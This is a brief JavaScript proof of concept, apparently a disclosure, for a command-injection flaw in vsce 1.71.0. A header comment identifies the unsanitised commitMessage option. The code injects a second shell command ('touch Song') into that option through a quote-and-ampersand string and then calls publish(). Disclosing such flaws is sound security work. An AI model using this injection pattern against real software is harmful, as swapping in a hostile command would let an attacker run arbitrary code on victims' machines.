/**
 * vsce@1.71.0 is vulnerable to command injection.
 * the injection point is located in line 110 of file "out/publish.js" in function versionBump(),
 * which is called by the index file "out/api.js" of this package.
 * the variable "options.commitMessage" can be used as part of the arg of exec function without 
 * any sanitization. 
 */



var root = require("vsce");
var attack_command = "touch Song";
var options = {
  "version": 'major',
  "commitMessage": "\"&" + attack_command + "\""
}
root.publish(options);
